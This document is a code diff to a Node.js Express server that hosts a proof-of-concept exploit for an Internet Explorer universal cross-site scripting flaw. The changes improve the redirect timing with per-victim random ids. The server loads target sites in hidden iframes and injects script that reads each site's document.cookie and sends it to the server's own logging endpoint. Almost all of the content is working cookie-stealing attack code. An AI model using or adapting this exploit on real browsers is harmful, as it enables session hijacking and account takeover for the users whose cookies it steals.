@@ -12,6 +12,7 @@
 
 var conf = require('./conf');
 var targets = conf.targets;
+var onFinished = require('on-finished');
 var thisHost = conf.host;
 var express = require('express');
 var url = require('url');
@@ -26,10 +27,58 @@ app.use(function(req, res, next) {
   next();
 });
 
-app.get('/r/:id', function(req, res, next) {
+var exploitObj = {};
+
+function doRedirect(rand) {
+  exploitObj[rand].redRes.redirect(exploitObj[rand].redUrl);
+
+  onFinished(exploitObj[rand].redRes, function (err, res) {
+    doWait(rand);
+  });
+}
+
+function doWait(rand) {
   setTimeout(function() {
-    res.redirect(targets[parseInt(req.params.id)]);
-  }, 2000);
+    exploitObj[rand].waiRes.send('');
+    onFinished(exploitObj[rand].waiRes, function(err, res) {
+      delete exploitObj[rand];
+    });
+  }, 500);
+}
+
+function create(rand) {
+  exploitObj[rand] = {
+    rDone: false,
+    waiRes: null,
+    redRes: null,
+    redUrl: null
+  };
+}
+
+app.get('/r/:rand/:id', function(req, res, next) {
+
+  var id = parseInt(req.params.id);
+  var rand = req.params.rand;
+  if (!exploitObj[rand]) create(rand);
+
+  exploitObj[rand].redRes = res;
+  exploitObj[rand].redUrl = targets[id];
+
+  if (exploitObj[rand].waiRes) {
+    doRedirect(rand);
+  }
+});
+
+app.get('/d/:rand/:id', function(req, res, next) {
+  var id = parseInt(req.params.id);
+  var rand = req.params.rand;
+  if (!exploitObj[rand]) create(rand);
+
+  exploitObj[rand].waiRes = res;
+
+  if (exploitObj[rand].redRes) {
+    doRedirect(rand);
+  }
 });
 
 app.get('/l', function(req, res, next) {
@@ -43,23 +92,18 @@ app.get('/l', function(req, res, next) {
   console.log(JSON.stringify(cs, null, ' '));
 });
 
-app.get('/d', function(req, res, next) {
-  setTimeout(function() {
-    res.send('');
-  }, 5000);
-});
-
-function getExploit(id) {
-  return 'frames[0].eval(\'_=parent.frames[1];with(new XMLHttpRequest)open("get","' + thisHost + '/d",false),send();_.location="javascript:bkp=\\\'' + thisHost + '/l?_id=' + id + '|\\\'+document.cookie;window.location(bkp);"\');';
+function getExploit(rand, id) {
+  return 'frames[0].eval(\'_=parent.frames[1];with(new XMLHttpRequest())open("get","' + thisHost + '/d/' + rand + '/' + id + '",false),send();_.location="javascript:bkp=\\\'' + thisHost + '/l?_id=' + id + '|\\\'+document.cookie;window.location(bkp);"\');';
 }
 
-app.get('/exploit/:id', function(req, res, next) {
+app.get('/exploit/:rand/:id', function(req, res, next) {
   var id = parseInt(req.params.id);
+  var rand = req.params.rand;
   var page = [
-    '<iframe style="display:none;" src="/r/' + id + '"></iframe>',
-    '<iframe style="display:none;" src="' + targets[id] + '"></iframe>',
+    '<iframe style="display:none" src="/r/' + rand + '/' + id + '"></iframe>',
+    '<iframe style="display:none" src="' + targets[id] + '"></iframe>',
     '<script>',
-    getExploit(id),
+    getExploit(rand, id),
     '</script>'
   ];
   res.send(page.join('\n'));
@@ -74,13 +118,15 @@ app.use(function(req, res, next) {
   page.push('<p>Original exploit: http://www.deusen.co.uk/items/insider3show.3362009741042107/</p>');
   page.push('<p>Further POC: http://packetstormsecurity.com/files/130308/Microsoft-Internet-Explorer-Universal-XSS-Proof-Of-Concept.html</p>');
 
+
   for (var k = 0; k < targets.length; k++) {
-    page.push('<iframe style="display:none;" id="iframe' + k + '"></iframe>');
+    page.push('<iframe style="display:none" id="iframe' + k + '"></iframe>');
   }
 
   page.push('<script>function loadAll() {');
   for (var i = 0; i < targets.length; i++) {
-    page.push('var ifr = document.getElementById("iframe' + i + '"); ifr.src = "/exploit/' + i + '";');
+    var rand = ('' + Math.random()).split('.')[1];
+    page.push('var ifr = document.getElementById("iframe' + i + '"); ifr.src = "/exploit/' + rand + '/' + i + '";');
   }
   page.push('} setTimeout(loadAll, 5);');
   page.push('</script></body></html>');
